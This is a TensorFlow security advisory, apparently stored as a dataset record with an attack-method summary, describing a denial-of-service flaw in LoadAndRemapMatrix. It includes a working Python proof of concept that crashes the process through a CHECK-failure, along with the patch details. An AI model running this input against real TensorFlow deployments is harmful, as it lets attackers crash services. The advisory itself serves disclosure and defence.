{"description": "### Impact\nAn attacker can cause a denial of service by exploiting a `CHECK`-failure coming from `tf.raw_ops.LoadAndRemapMatrix`:\n    \n```python\nimport tensorflow as tf\n\nckpt_path = tf.constant([], shape=[0], dtype=tf.string)\nold_tensor_name = tf.constant(\"\")\nrow_remapping = tf.constant([], shape=[0], dtype=tf.int64)\ncol_remapping = tf.constant([1], shape=[1], dtype=tf.int64)\ninitializing_values = tf.constant(1.0)\n\ntf.raw_ops.LoadAndRemapMatrix(\n    ckpt_path=ckpt_path, old_tensor_name=old_tensor_name,\n    row_remapping=row_remapping, col_remapping=col_remapping,\n    initializing_values=initializing_values, num_rows=0, num_cols=1)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/d94227d43aa125ad8b54115c03cece54f6a1977b/tensorflow/core/kernels/ragged_tensor_to_tensor_op.cc#L219-L222) assumes that the `ckpt_path` is always a valid scalar.\n  \n```cc\nconst string& ckpt_path = ckpt_path_t->scalar<tstring>()();\n```\n\nHowever, an attacker can send any other tensor as the first argument of `LoadAndRemapMatrix`. This would cause the rank `CHECK` in `scalar<T>()()` to trigger and terminate the process.\n\n### Patches\nWe have patched the issue in GitHub commit [77dd114513d7796e1e2b8aece214a380af26fbf4](https://github.com/tensorflow/tensorflow/commit/77dd114513d7796e1e2b8aece214a380af26fbf4).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.", "methods": ["Used a CHECK-fail in `LoadAndRemapMatrix` to cause a denial of service.", "Exploited a rank CHECK in `scalar<T>()()` to trigger process termination."]}
